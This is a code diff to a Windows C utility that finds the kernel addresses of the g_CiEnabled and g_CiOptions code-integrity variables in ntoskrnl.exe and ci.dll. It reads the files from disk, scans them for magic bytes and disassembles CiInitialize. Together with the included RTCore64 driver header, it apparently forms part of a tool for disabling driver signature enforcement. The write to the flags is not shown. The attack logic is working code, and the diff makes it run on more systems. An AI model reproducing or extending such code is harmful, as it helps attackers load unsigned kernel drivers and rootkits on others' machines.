@@ -26,6 +26,7 @@
 //lint -e1924 Warning 1924: C-style cast -- More Effective C++ #2
 
 #include "MyFunctions.h"
+#include <string.h>
 #include "RTCore64.h"
 #include "DBUtil.h"
 // Hacker Disassembler Engine 64
@@ -45,11 +46,11 @@ GLOBALS g;
 // release of Windows 8.1 the value returned by the GetVersion and GetVersionEx
 // function now depends on how the application is manifested.
 //------------------------------------------------------------------------------
-int MyRtlGetVersion(OSVERSIONINFO *osvi)
+int MyRtlGetVersion(RTL_OSVERSIONINFOW *osvi)
 {
-	// zero OSVERSIONINFO memory and set OSVERSIONINFO size
-	ZeroMemory(osvi,sizeof(OSVERSIONINFO));
-	osvi->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+	// zero RTL_OSVERSIONINFOW memory and set RTL_OSVERSIONINFOW size
+	ZeroMemory(osvi,sizeof(RTL_OSVERSIONINFOW));
+	osvi->dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
 
 	// get handle to ntdll.dll
 	HINSTANCE hLib = LoadLibrary("ntdll.dll");
@@ -68,7 +69,7 @@ int MyRtlGetVersion(OSVERSIONINFO *osvi)
 
 	// get version information about the currently running operating system
 	//lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
-	if(RtlGetVersion((PRTL_OSVERSIONINFOW)osvi) != 0)
+	if(RtlGetVersion(osvi) != 0)
 	{
 		FreeLibrary(hLib);
 		return 3;
@@ -88,6 +89,7 @@ int MyGetImageBaseInKernelAddressSpace(const char *szModuleName,UINT64 *ui64Imag
 {
 	// zero image base address
 	*ui64ImageBase = 0;
+	*ulImageSize = 0;
 
 	// get handle to ntdll.dll
 	HINSTANCE hLib = LoadLibrary("ntdll.dll");
@@ -111,10 +113,15 @@ int MyGetImageBaseInKernelAddressSpace(const char *szModuleName,UINT64 *ui64Imag
 	ULONG ulReturnLength = 0;
 	//lint -e{534} Warning 534: Ignoring return value of function
 	NtQuerySystemInformation(SystemModuleInformation,NULL,0,&ulReturnLength);
+	if(ulReturnLength == 0)
+	{
+		FreeLibrary(hLib);
+		return 3;
+	}
 
 	// allocate memory for system module information
 	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 1) unsigned long to unsigned long long
-	PRTL_PROCESS_MODULES pModules = (PRTL_PROCESS_MODULES)malloc(ulReturnLength);
+	PRTL_PROCESS_MODULES64 pModules = (PRTL_PROCESS_MODULES64)malloc(ulReturnLength);
 	if(pModules == NULL)
 	{
 		FreeLibrary(hLib);
@@ -124,6 +131,7 @@ int MyGetImageBaseInKernelAddressSpace(const char *szModuleName,UINT64 *ui64Imag
 	// retrieve system module information
 	if(NtQuerySystemInformation(SystemModuleInformation,pModules,ulReturnLength,&ulReturnLength) != 0)
 	{
+		free(pModules);
 		FreeLibrary(hLib);
 		return 4;
 	}
@@ -135,7 +143,8 @@ int MyGetImageBaseInKernelAddressSpace(const char *szModuleName,UINT64 *ui64Imag
 	for(ULONG i = 0; i < pModules->NumberOfModules; i++)
 	{
 		// check if module name matches our first function argument
-		if(_stricmp((const char*)&pModules->Modules[i].FullPathName[pModules->Modules[i].OffsetToFileName],szModuleName) == 0)
+		if(pModules->Modules[i].OffsetToFileName < sizeof(pModules->Modules[i].FullPathName) &&
+		   _stricmp((const char*)&pModules->Modules[i].FullPathName[pModules->Modules[i].OffsetToFileName],szModuleName) == 0)
 		{
 			// return image base and image size
 			*ui64ImageBase = (UINT64)pModules->Modules[i].ImageBase;
@@ -161,78 +170,311 @@ int MyGetImageBaseInKernelAddressSpace(const char *szModuleName,UINT64 *ui64Imag
 //------------------------------------------------------------------------------
 // get g_CiEnabled kernel address
 //------------------------------------------------------------------------------
-int MyGetg_CiEnabledKernelAddress(UINT64 ui64ImageBase,ULONG ulImageSize,UINT64 *ui64Kernelg_CiEnabled)
+
+
+//------------------------------------------------------------------------------
+// PE file helpers (cross-bitness safe)
+//
+// A 32-bit (WOW64) host process cannot LoadLibraryEx a 64-bit kernel PE such as
+// ntoskrnl.exe / ci.dll, so instead we read the file from disk and parse it. This
+// works identically on native x64 and on 32-bit WOW64 hosts and also removes a
+// dependency on the loader for the kernel modules.
+//------------------------------------------------------------------------------
+
+// Read a PE file completely into memory. Caller must free() the returned buffer.
+static BYTE* MyLoadPeFile(const char *szPath,DWORD *pdwSize)
 {
-	// zero kernel address of g_CiEnabled
-	*ui64Kernelg_CiEnabled = 0;
+#ifndef _WIN64
+    // A WOW64 process is subject to filesystem redirection: CreateFile on
+    // "%SystemRoot%\System32\..." is silently redirected to SysWOW64, where
+    // ntoskrnl.exe / ci.dll do not exist. Disable redirection around the open
+    // call. On native 32-bit Windows the API is absent and the plain path is used.
+    typedef BOOL (WINAPI *Wow64DisableWow64FsRedirectionProc)(PVOID *OldValue);
+    typedef BOOL (WINAPI *Wow64RevertWow64FsRedirectionProc)(PVOID OldValue);
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    Wow64DisableWow64FsRedirectionProc pfnWow64Disable = NULL;
+    Wow64RevertWow64FsRedirectionProc pfnWow64Revert = NULL;
+    PVOID pWow64OldValue = NULL;
+    BOOL bWow64RedirectionDisabled = FALSE;
+    if(hKernel32 != NULL)
+    {
+        pfnWow64Disable = (Wow64DisableWow64FsRedirectionProc)GetProcAddress(hKernel32,"Wow64DisableWow64FsRedirection");
+        pfnWow64Revert = (Wow64RevertWow64FsRedirectionProc)GetProcAddress(hKernel32,"Wow64RevertWow64FsRedirection");
+        if(pfnWow64Disable != NULL) bWow64RedirectionDisabled = pfnWow64Disable(&pWow64OldValue);
+    }
+#endif
+    HANDLE hFile = CreateFileA(szPath,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+#ifndef _WIN64
+    if(bWow64RedirectionDisabled && pfnWow64Revert != NULL) pfnWow64Revert(pWow64OldValue);
+#endif
+    if(hFile == INVALID_HANDLE_VALUE) return NULL;
+    DWORD dwSize = GetFileSize(hFile,NULL);
+    if(dwSize == INVALID_FILE_SIZE || dwSize == 0) { CloseHandle(hFile); return NULL; }
+    BYTE *pBuf = (BYTE*)malloc(dwSize);
+    if(pBuf == NULL) { CloseHandle(hFile); return NULL; }
+    DWORD dwRead = 0;
+    if(!ReadFile(hFile,pBuf,dwSize,&dwRead,NULL) || dwRead != dwSize) { free(pBuf); CloseHandle(hFile); return NULL; }
+    CloseHandle(hFile);
+    *pdwSize = dwSize;
+    return pBuf;
+}
 
-	// zero ntoskrnl.exe file path
-	char szNtoskrnlExe[MAX_PATH];
-	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 3) int to unsigned long long
-	memset(szNtoskrnlExe,0,MAX_PATH);
+// Translate a Relative Virtual Address to a pointer inside the in-memory PE.
+static BYTE* MyRvaToPtr(BYTE *pFile,DWORD dwFileSize,DWORD rva)
+{
+    if(dwFileSize < sizeof(IMAGE_DOS_HEADER)) return NULL;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)pFile;
+    if(dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+    if((DWORD)dos->e_lfanew > dwFileSize || dwFileSize - (DWORD)dos->e_lfanew < sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(WORD)) return NULL;
+    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64*)(pFile + dos->e_lfanew);
+    if(nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
+    DWORD dwOptionalSizeForHeaders = nt->FileHeader.SizeOfOptionalHeader;
+    if(dwOptionalSizeForHeaders < sizeof(IMAGE_OPTIONAL_HEADER64)) return NULL;
+    DWORD dwOptionalOffsetForHeaders = sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
+    if(dwOptionalSizeForHeaders > dwFileSize - (DWORD)dos->e_lfanew - dwOptionalOffsetForHeaders) return NULL;
+    if(rva < nt->OptionalHeader.SizeOfHeaders)
+    {
+        if(rva >= dwFileSize) return NULL;
+        return pFile + rva;
+    }
+    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
+    DWORD dwOptionalSize = nt->FileHeader.SizeOfOptionalHeader;
+    if(dwOptionalSize < sizeof(IMAGE_OPTIONAL_HEADER64)) return NULL;
+    DWORD dwOptionalOffset = sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
+    if(dwOptionalSize > dwFileSize - (DWORD)dos->e_lfanew - dwOptionalOffset) return NULL;
+    DWORD dwSectionOffset = (DWORD)dos->e_lfanew + dwOptionalOffset + dwOptionalSize;
+    if(dwSectionOffset > dwFileSize) return NULL;
+    if(nt->FileHeader.NumberOfSections > (dwFileSize - dwSectionOffset) / sizeof(IMAGE_SECTION_HEADER)) return NULL;
+    sec = (IMAGE_SECTION_HEADER*)(pFile + dwSectionOffset);
+    for(WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
+    {
+        DWORD start = sec[i].VirtualAddress;
+        DWORD vsize = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
+        if(rva >= start)
+        {
+            DWORD delta = rva - start;
+            if(delta < vsize && delta < sec[i].SizeOfRawData)
+            {
+                DWORD raw = sec[i].PointerToRawData;
+                if(raw <= dwFileSize && delta <= dwFileSize - raw)
+                    return pFile + raw + delta;
+            }
+        }
+            ;
+    }
+    return NULL;
+}
 
-	// get system directory path
-	if(GetSystemDirectory(szNtoskrnlExe,MAX_PATH) == 0)
-	{
-		return 1;
-	}
+// Map an RVA byte range to a pointer in the file buffer, or NULL when the range
+// is not fully backed by file data.
+static BYTE* MyRvaRangeToPtr(BYTE *pFile,DWORD dwFileSize,DWORD rva,DWORD cb)
+{
+    if(pFile == NULL || cb == 0) return NULL;
+    if(dwFileSize < sizeof(IMAGE_DOS_HEADER)) return NULL;
 
-	// add file name of ntoskrnl.exe
-	lstrcat(szNtoskrnlExe,"\\ntoskrnl.exe");
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)pFile;
+    if(dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+    if((DWORD)dos->e_lfanew > dwFileSize || dwFileSize - (DWORD)dos->e_lfanew < sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(WORD)) return NULL;
 
-	// load the module ntoskrnl.exe into the address space of our process
-	HMODULE hLib = LoadLibraryEx(szNtoskrnlExe,NULL,DONT_RESOLVE_DLL_REFERENCES);
-	if(hLib == NULL)
-	{
-		return 2;
-	}
+    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64*)(pFile + dos->e_lfanew);
+    if(nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
 
-	// search the complete module for the magic bytes
-	LONG g_CiEnabledOffset = 0;
-	UINT64 g_CiEnabled = 0;
-	for(ULONG i = 0; i < ulImageSize - 4; i++)
-	{
-		// check for magic bytes
-		//lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
-		if(*(DWORD*)((BYTE*)hLib + i) == 0x1D8806EB)
-		{
-			// if we get here we found the magic byte sequence which marks the jump instruction after the CiInitialize call
-			// directly after the found byte sequence we get the offset of g_CiEnabled
-			// PAGE:00000001403F5B73                 call    CiInitialize
-			// PAGE:00000001403F5B78                 mov     ebx, eax
-			// PAGE:00000001403F5B7A                 jmp     short loc_1403F5B82
-			// PAGE:00000001403F5B7C ; ---------------------------------------------------------------------------
-			// PAGE:00000001403F5B7C
-			// PAGE:00000001403F5B7C loc_1403F5B7C:                          ; CODE XREF: SepInitializeCodeIntegrity+12j
-			// PAGE:00000001403F5B7C                 mov     cs:g_CiEnabled, bl
-			// Attention: It is important here that we use a LONG value and no DWORD value,
-			// because the offsets in the disassembly are signed to also reach negative values.
-			g_CiEnabledOffset = *(LONG*)((BYTE*)hLib + i + 4);
-			// calculate virtual address of g_CiEnabled
-			g_CiEnabled = (UINT64)((BYTE*)hLib + i + 8 + g_CiEnabledOffset);
-			// leave the for loop
-			break;
-		}
-	}
+    DWORD dwOptionalSize = nt->FileHeader.SizeOfOptionalHeader;
+    if(dwOptionalSize < sizeof(IMAGE_OPTIONAL_HEADER64)) return NULL;
+    DWORD dwOptionalOffset = sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
+    if(dwOptionalSize > dwFileSize - (DWORD)dos->e_lfanew - dwOptionalOffset) return NULL;
+    DWORD dwSectionOffset = (DWORD)dos->e_lfanew + dwOptionalOffset + dwOptionalSize;
+    if(dwSectionOffset > dwFileSize) return NULL;
+    if(nt->FileHeader.NumberOfSections > (dwFileSize - dwSectionOffset) / sizeof(IMAGE_SECTION_HEADER)) return NULL;
 
-	// check if we have found the offset and virtual address of g_CiEnabled
-	if(g_CiEnabledOffset == 0 || g_CiEnabled == 0)
-	{
-		FreeLibrary(hLib);
-		return 3;
-	}
+    DWORD dwSizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;
+    if(rva < dwSizeOfHeaders)
+    {
+        if(cb > dwSizeOfHeaders - rva) return NULL;
+        if(rva >= dwFileSize || cb > dwFileSize - rva) return NULL;
+        return pFile + rva;
+    }
 
-	// calculate kernel address of g_CiEnabled
-	*ui64Kernelg_CiEnabled = ui64ImageBase + g_CiEnabled - (UINT64)hLib;
+    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER*)(pFile + dwSectionOffset);
+    for(WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
+    {
+        DWORD dwVirtualStart = sec[i].VirtualAddress;
+        DWORD dwRawSize = sec[i].SizeOfRawData;
+        DWORD dwVirtualSize = sec[i].Misc.VirtualSize;
+        if(dwVirtualSize == 0) dwVirtualSize = dwRawSize;
+        if(dwVirtualSize == 0 || rva < dwVirtualStart) continue;
 
-	// free library
-	FreeLibrary(hLib);
+        DWORD dwDelta = rva - dwVirtualStart;
+        if(dwDelta >= dwVirtualSize) continue;
+        if(dwDelta >= dwRawSize || cb > dwRawSize - dwDelta) return NULL;
 
-	return 0;
+        DWORD dwRawOffset = sec[i].PointerToRawData;
+        if(dwRawOffset > dwFileSize) return NULL;
+        if(dwDelta > dwFileSize - dwRawOffset || cb > dwFileSize - dwRawOffset - dwDelta) return NULL;
+        return pFile + dwRawOffset + dwDelta;
+    }
+
+    return NULL;
+}
+
+// Bounded string compare against a file-backed export name.
+static int MyPeCompareName(BYTE *pFile,DWORD dwFileSize,DWORD rva,const char *szName)
+{
+    BYTE *pName = MyRvaToPtr(pFile,dwFileSize,rva);
+    if(pName == NULL) return 0;
+
+    DWORD dwOffset = (DWORD)(pName - pFile);
+    if(dwOffset >= dwFileSize) return 0;
+
+    DWORD dwMaxCompare = dwFileSize - dwOffset;
+    for(DWORD i = 0; i < dwMaxCompare; i++)
+    {
+        if(pName[i] == 0) return (szName[i] == 0) ? 1 : 0;
+        if(szName[i] == 0 || pName[i] != (BYTE)szName[i]) return 0;
+    }
+    return 0;
+}
+
+// Resolve the RVA of an exported function by name.
+static DWORD MyGetExportRva(BYTE *pFile,DWORD dwFileSize,const char *szName)
+{
+    if(dwFileSize < sizeof(IMAGE_DOS_HEADER)) return 0;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)pFile;
+    if(dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
+    if((DWORD)dos->e_lfanew > dwFileSize || dwFileSize - (DWORD)dos->e_lfanew < sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(WORD)) return 0;
+    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64*)(pFile + dos->e_lfanew);
+    if(nt->Signature != IMAGE_NT_SIGNATURE) return 0;
+    WORD wMagic = *(WORD*)(pFile + (DWORD)dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
+    if(wMagic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return 0;
+    DWORD dwOptionalSize = nt->FileHeader.SizeOfOptionalHeader;
+    if(dwOptionalSize < sizeof(IMAGE_OPTIONAL_HEADER64)) return 0;
+    DWORD dwOptionalOffset = sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
+    if(dwOptionalSize > dwFileSize - (DWORD)dos->e_lfanew - dwOptionalOffset) return 0;
+    DWORD expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    DWORD expSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
+    if(expRva == 0 || expSize < sizeof(IMAGE_EXPORT_DIRECTORY)) return 0;
+    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY*)MyRvaRangeToPtr(pFile,dwFileSize,expRva,sizeof(IMAGE_EXPORT_DIRECTORY));
+    if(exp == NULL) return 0;
+    DWORD dwNumberOfNames = exp->NumberOfNames;
+    DWORD dwNumberOfFunctions = exp->NumberOfFunctions;
+    if(dwNumberOfNames == 0 || dwNumberOfFunctions == 0) return 0;
+    if(dwNumberOfNames > dwFileSize / sizeof(DWORD)) return 0;
+    if(dwNumberOfFunctions > dwFileSize / sizeof(DWORD)) return 0;
+    if(dwNumberOfNames > dwFileSize / sizeof(WORD)) return 0;
+    DWORD *pNames = (DWORD*)MyRvaRangeToPtr(pFile,dwFileSize,exp->AddressOfNames,dwNumberOfNames * sizeof(DWORD));
+    DWORD *pFuncs = (DWORD*)MyRvaRangeToPtr(pFile,dwFileSize,exp->AddressOfFunctions,dwNumberOfFunctions * sizeof(DWORD));
+    WORD  *pOrds  = (WORD*)MyRvaRangeToPtr(pFile,dwFileSize,exp->AddressOfNameOrdinals,dwNumberOfNames * sizeof(WORD));
+    if(pNames == NULL || pFuncs == NULL || pOrds == NULL) return 0;
+    for(DWORD i = 0; i < dwNumberOfNames; i++)
+    {
+        ;
+        if(pOrds[i] < dwNumberOfFunctions && MyPeCompareName(pFile,dwFileSize,pNames[i],szName))
+            return pFuncs[pOrds[i]];
+    }
+    return 0;
+}
+
+// Scan every section for a 4-byte magic value. When found, the resulting RVA is
+//   rva = section_virtual_address + match_offset + dwExtraBytes + signed_offset
+// where signed_offset is the LONG stored at (match_offset + dwOffsetAt).
+static int MyPeFindMagicRva(BYTE *pFile,DWORD dwFileSize,DWORD dwMagic,DWORD dwOffsetAt,DWORD dwExtraBytes,LONG *plOffset,UINT64 *pui64Rva)
+{
+    if(dwFileSize < sizeof(IMAGE_DOS_HEADER)) return 1;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)pFile;
+    if(dos->e_magic != IMAGE_DOS_SIGNATURE) return 1;
+    if((DWORD)dos->e_lfanew > dwFileSize || dwFileSize - (DWORD)dos->e_lfanew < sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(WORD)) return 1;
+    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64*)(pFile + dos->e_lfanew);
+    if(nt->Signature != IMAGE_NT_SIGNATURE) return 2;
+    DWORD dwOptionalSize = nt->FileHeader.SizeOfOptionalHeader;
+    if(dwOptionalSize < sizeof(IMAGE_OPTIONAL_HEADER64)) return 1;
+    DWORD dwOptionalOffset = sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
+    if(dwOptionalSize > dwFileSize - (DWORD)dos->e_lfanew - dwOptionalOffset) return 1;
+    DWORD dwSectionOffset = (DWORD)dos->e_lfanew + dwOptionalOffset + dwOptionalSize;
+    if(dwSectionOffset > dwFileSize) return 1;
+    if(nt->FileHeader.NumberOfSections > (dwFileSize - dwSectionOffset) / sizeof(IMAGE_SECTION_HEADER)) return 1;
+    IMAGE_SECTION_HEADER *sec = NULL;
+    sec = (IMAGE_SECTION_HEADER*)(pFile + dwSectionOffset);
+#if 0
+    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
+#endif
+    for(WORD s = 0; s < nt->FileHeader.NumberOfSections; s++)
+    {
+        DWORD raw = sec[s].PointerToRawData;
+        DWORD rawSize = sec[s].SizeOfRawData;
+        DWORD vstart = sec[s].VirtualAddress;
+        if(raw == 0 || rawSize < sizeof(DWORD)) continue;
+        if(raw > dwFileSize) continue;
+        DWORD dwRawAvailable = dwFileSize - raw;
+        if(rawSize > dwRawAvailable) rawSize = dwRawAvailable;
+        for(DWORD o = 0; o + sizeof(DWORD) <= rawSize; o++)
+        {
+            if(*(DWORD*)(pFile + raw + o) == dwMagic)
+            {
+                if(dwOffsetAt > rawSize - o || (rawSize - o) - dwOffsetAt < sizeof(LONG)) return 4;
+                LONG lOffset = *(LONG*)(pFile + raw + o + dwOffsetAt);
+                *plOffset = lOffset;
+                LONGLONG llRva = (LONGLONG)vstart + (LONGLONG)o + (LONGLONG)dwExtraBytes + (LONGLONG)lOffset;
+                if(llRva < 0 || (ULONGLONG)llRva > 0xFFFFFFFFULL) return 5;
+                *pui64Rva = (UINT64)llRva;
+                return 0;
+            }
+        }
+    }
+    return 3;
 }
 
 
 //------------------------------------------------------------------------------
+// get g_CiEnabled kernel address
+//------------------------------------------------------------------------------
+int MyGetg_CiEnabledKernelAddress(UINT64 ui64ImageBase,ULONG ulImageSize,UINT64 *ui64Kernelg_CiEnabled)
+{
+    // zero kernel address of g_CiEnabled
+    *ui64Kernelg_CiEnabled = 0;
+
+    UNREFERENCED_PARAMETER(ulImageSize);
+
+    // zero ntoskrnl.exe file path
+    char szNtoskrnlExe[MAX_PATH];
+    memset(szNtoskrnlExe,0,MAX_PATH);
+
+    // get system directory path
+    if(GetSystemDirectory(szNtoskrnlExe,MAX_PATH) == 0)
+    {
+        return 1;
+    }
+
+    // add file name of ntoskrnl.exe
+    lstrcat(szNtoskrnlExe,"\\ntoskrnl.exe");
+
+    // Load ntoskrnl.exe from disk and parse it ourselves. A 32-bit (WOW64) host
+    // process cannot LoadLibraryEx the 64-bit kernel PE, but reading the file and
+    // parsing it is bitness-agnostic.
+    DWORD dwFileSize = 0;
+    BYTE *pFile = MyLoadPeFile(szNtoskrnlExe,&dwFileSize);
+    if(pFile == NULL)
+    {
+        return 2;
+    }
+
+    // search the complete module (parsed from disk) for the magic bytes 0x1D8806EB
+    LONG g_CiEnabledOffset = 0;
+    UINT64 g_CiEnabledRva = 0;
+    if(MyPeFindMagicRva(pFile,dwFileSize,0x1D8806EB,4,8,&g_CiEnabledOffset,&g_CiEnabledRva) != 0)
+    {
+        free(pFile);
+        return 3;
+    }
+
+    // calculate kernel address of g_CiEnabled
+    *ui64Kernelg_CiEnabled = ui64ImageBase + g_CiEnabledRva;
+
+    // free file buffer
+    free(pFile);
+
+    return 0;
+}
+
 // get g_CiOptions kernel address
 //------------------------------------------------------------------------------
 int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOptions,DWORD dwBuildNumber)
@@ -254,23 +496,34 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 	// add file name of ci.dll
 	lstrcat(szCiDll,"\\ci.dll");
 
-	// load the module ci.dll into the address space of our process
-	HMODULE hLib = LoadLibraryEx(szCiDll,NULL,DONT_RESOLVE_DLL_REFERENCES);
-	if(hLib == NULL)
+	// Load ci.dll from disk and parse it ourselves (cross-bitness safe: a 32-bit
+	// WOW64 host cannot LoadLibraryEx the 64-bit ci.dll PE).
+	DWORD dwFileSize = 0;
+	BYTE *pFile = MyLoadPeFile(szCiDll,&dwFileSize);
+	if(pFile == NULL)
 	{
 		return 2;
 	}
 
-	// retrieve address of exported function CiInitialize
-	BYTE *CiInitialize = NULL;
+	// resolve exported function CiInitialize by parsing the PE export table
+	DWORD ciInitRva = MyGetExportRva(pFile,dwFileSize,"CiInitialize");
 	//lint -e{611} Warning 611: Suspicious cast
-	//lint -e{838} Warning 838: Previously assigned value to variable has not been used
-	CiInitialize = (BYTE*)GetProcAddress(hLib,"CiInitialize");
+	BYTE *CiInitialize = (ciInitRva != 0) ? MyRvaToPtr(pFile,dwFileSize,ciInitRva) : NULL;
 	if(CiInitialize == NULL)
 	{
-		FreeLibrary(hLib);
+		free(pFile);
 		return 3;
 	}
+	DWORD dwCiInitFileOffset = (DWORD)((BYTE*)CiInitialize - pFile);
+	if(dwCiInitFileOffset >= dwFileSize || dwFileSize - dwCiInitFileOffset < 16)
+	{
+		free(pFile);
+		return 3;
+	}
+	DWORD dwCiInitAvailable = dwFileSize - dwCiInitFileOffset;
+	// RVA of function CipInitialize (filled once found) and of variable g_CiOptions
+	DWORD cipInitRva = 0;
+	DWORD g_CiOptionsRva = 0;
 
 	// zero Hacker Disassembler Engine 64 structure
 	hde64s hs;
@@ -282,7 +535,7 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 	{
 		// search the first 0x48 bytes of the function CiInitialize for the "jmp CipInitialize" instruction
 		// the function CiInitialize should never be more than 0x48 bytes in size for Windows 8.1 x64 Enterprise
-		for(ULONG i = 0; i < 0x48; i += hs.len)
+		for(ULONG i = 0; i < 0x48 && i + 15 <= dwCiInitAvailable; i += hs.len)
 		{
 			// disassemble code with Hacker Disassembler Engine 64
 			//lint -e{534} Warning 534: Ignoring return value of function
@@ -290,7 +543,7 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 			// check for disassembler error
 			if(hs.flags & F_ERROR)
 			{
-				FreeLibrary(hLib);
+				free(pFile);
 				return 4;
 			}
 
@@ -342,6 +595,26 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 				CipInitializeOffset = *(LONG*)((BYTE*)CiInitialize + i + 1);
 				// calculate virtual address of function CipInitialize
 				CipInitialize = (CiInitialize + i + 5 + CipInitializeOffset);
+				// track its RVA so we can derive g_CiOptions later
+				cipInitRva = ciInitRva + (DWORD)((BYTE*)CipInitialize - (BYTE*)CiInitialize);
+				LONGLONG llCipInitRva = (LONGLONG)ciInitRva + (LONGLONG)i + 5 + (LONGLONG)CipInitializeOffset;
+				if(llCipInitRva < 0 || (ULONGLONG)llCipInitRva > 0xFFFFFFFFULL)
+				{
+					free(pFile);
+					return 6;
+				}
+				cipInitRva = (DWORD)llCipInitRva;
+				CipInitialize = MyRvaToPtr(pFile,dwFileSize,cipInitRva);
+				if(CipInitialize == NULL)
+				{
+					free(pFile);
+					return 6;
+				}
+				if((ULONG_PTR)CipInitialize < (ULONG_PTR)pFile || (ULONG_PTR)CipInitialize - (ULONG_PTR)pFile >= dwFileSize)
+				{
+					free(pFile);
+					return 6;
+				}
 				// leave the for loop
 				break;
 			}
@@ -355,7 +628,7 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 
 		// search the first 0x6E bytes of the function CiInitialize for the "call CipInitialize" instruction
 		// the function CiInitialize should never be more than 0x6E bytes in size for Windows 10 x64 Build 21H2 and Build 22H2
-		for(ULONG i = 0; i < 0x6E; i += hs.len)
+		for(ULONG i = 0; i < 0x6E && i + 15 <= dwCiInitAvailable; i += hs.len)
 		{
 			// disassemble code with Hacker Disassembler Engine 64
 			//lint -e{534} Warning 534: Ignoring return value of function
@@ -363,7 +636,7 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 			// check for disassembler error
 			if(hs.flags & F_ERROR)
 			{
-				FreeLibrary(hLib);
+				free(pFile);
 				return 5;
 			}
 
@@ -441,6 +714,26 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 				CipInitializeOffset = *(LONG*)((BYTE*)CiInitialize + i + 1);
 				// calculate virtual address of function CipInitialize
 				CipInitialize = (CiInitialize + i + 5 + CipInitializeOffset);
+				// track its RVA so we can derive g_CiOptions later
+				cipInitRva = ciInitRva + (DWORD)((BYTE*)CipInitialize - (BYTE*)CiInitialize);
+				LONGLONG llCipInitRva = (LONGLONG)ciInitRva + (LONGLONG)i + 5 + (LONGLONG)CipInitializeOffset;
+				if(llCipInitRva < 0 || (ULONGLONG)llCipInitRva > 0xFFFFFFFFULL)
+				{
+					free(pFile);
+					return 6;
+				}
+				cipInitRva = (DWORD)llCipInitRva;
+				CipInitialize = MyRvaToPtr(pFile,dwFileSize,cipInitRva);
+				if(CipInitialize == NULL)
+				{
+					free(pFile);
+					return 6;
+				}
+				if((ULONG_PTR)CipInitialize < (ULONG_PTR)pFile || (ULONG_PTR)CipInitialize - (ULONG_PTR)pFile >= dwFileSize)
+				{
+					free(pFile);
+					return 6;
+				}
 				// leave the for loop
 				break;
 			}
@@ -456,15 +749,22 @@ int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOpt
 	// check if we have found the function offset and virtual address of CipInitialize
 	if(CipInitializeOffset == 0 || CipInitialize == 0)
 	{
-		FreeLibrary(hLib);
+		free(pFile);
 		return 6;
 	}
+	DWORD dwCipInitFileOffset = (DWORD)((BYTE*)CipInitialize - pFile);
+	if(dwCipInitFileOffset >= dwFileSize || dwFileSize - dwCipInitFileOffset < 16)
+	{
+		free(pFile);
+		return 6;
+	}
+	DWORD dwCipInitAvailable = dwFileSize - dwCipInitFileOffset;
 
 	// search the first 0x4A bytes of the function CipInitialize for the "mov cs:g_CiOptions, ecx" instruction
 	// the instruction should never be more than 0x4A bytes away from the CipInitialize function start for Windows 8.1 Enterprise x64 English Checked Debug Build
 	LONG g_CiOptionsOffset = 0;
